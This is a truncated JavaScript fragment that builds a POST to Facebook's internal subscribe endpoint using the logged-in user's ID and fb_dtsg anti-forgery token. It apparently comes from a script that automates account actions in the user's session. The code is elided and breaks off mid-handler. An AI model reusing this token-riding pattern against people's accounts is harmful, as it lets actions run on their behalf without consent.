...
function com(cc) {
    ...
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/ufi/subscribe.php";
    var PageParams = "subscribe_action=false&ft_ent_identifier="+cc+"&source=2&client_id=1381333719185%3A1166447810&rootid=u_0_8&ft[tn]=%3D&ft[type]=20&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=d&fb_dtsg="+fb_dtsg+"&ttstamp=26581678077995082";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
